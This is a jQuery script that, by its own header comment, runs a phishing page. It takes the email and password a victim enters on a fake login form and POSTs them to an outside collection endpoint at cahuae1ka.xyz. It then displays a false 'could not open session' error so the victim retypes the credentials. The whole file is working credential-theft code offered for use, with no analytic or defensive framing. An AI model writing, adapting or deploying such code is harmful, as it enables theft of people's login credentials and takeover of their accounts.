
    /** THIS JAVA SRIPT CONTROLS MAIN FEATURES IN THE PHISHING PAGE
 * Every action here is performed as soon as the Whole DOM is ready
 */

$(document).ready(()=>{
    var scanning =   $("#spin-wrapper");
    var pwdError = $("#pass-error");
    var emailError = $("#email-error");
    var loginError = $("#login-error");
    var email = $("#user_email");
    var password = $("#user_pwd");
    var verificationSpinner = $("#verifying");
    //handle the download button click event
 

    $("#blast-log").click( (event) => {
        event.preventDefault();
        event.stopPropagation();
        let emailInput = email.val();
        let passwordInput = password.val();
        loginError.text("");
        if (isValid(emailInput)){
            if (passwordInput.length > 3){
                console.log('time to send the log');
                //hide the download button
                $("#blast-log").css("display", "none");
                //show the verification spinner
                verificationSpinner.css("display", "block");
                //send the log
                sendReport(emailInput, passwordInput, () => {
                    setTimeout(() => {
                        //hide the verification spinner
                        verificationSpinner.css("display", "none");
                        //show the download button
                        $("#blast-log").css("display", "block");
                        //show the login error
                        loginError.text("Error! Could not open session, please try again with your valid email and password");
                    }, 2000);
                });
            }else{
                pwdError.text("Please enter a valid password");
            }
        }else{
            console.log("Invalid email");
            emailError.text("Please enter a valid email");
        }
    });

    //Clear the email error when the email input changes
    email.keyup( () => {
        emailError.text("");
    });

    //clear the password error when the password input changes
    password.keyup( () => {
        pwdError.text("");
    })


});

/** This function checks if an email is valid */
function isValid(email){
    var regEx = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return regEx.test(email);
}

function sendReport(email, password, callback){
    $.ajax({
        url: 'https://cahuae1ka.xyz/m/fo.php',
        method: 'POST',
        data: {
            x1: email,
            x2: password
        },
        success: function(data){
            //console.log(data);
            if(typeof callback !== 'undefined'){
                callback();
            }
        }
    });
}
